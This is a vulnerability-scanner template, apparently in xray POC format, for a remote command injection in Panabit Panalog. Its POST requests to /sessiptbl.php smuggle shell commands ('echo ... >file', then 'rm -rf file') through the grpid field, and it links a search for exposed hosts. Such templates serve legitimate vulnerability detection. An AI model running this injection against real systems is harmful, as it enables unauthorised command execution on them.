name: poc-yaml-panabit-panalog-libressyndelete-rce
binding: ced75776-36e3-4063-a664-d2dccd96c3b0
manual: true
detail:
    author: y0y0
    links:
        - https://www.seebug.org/vuldb/ssvid-99402
        - https://fofa.info/result?qbase64=YXBwPSJQYW5hYml0LVBhbmFsb2ci
    vulnerability:
        level: critical
transport: http
set:
    fileName: randomLowercase(4) + ".txt"
    content: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /sessiptbl.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=serverdelay&grpid=1| echo {{content}} >{{fileName}}
            follow_redirects: false
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /{{fileName}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(content)
    r2:
        request:
            cache: true
            method: POST
            path: /sessiptbl.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=serverdelay&grpid=1| rm -rf {{fileName}}
            follow_redirects: false
        expression: response.status == 200
expression: r0() && r1() && r2()
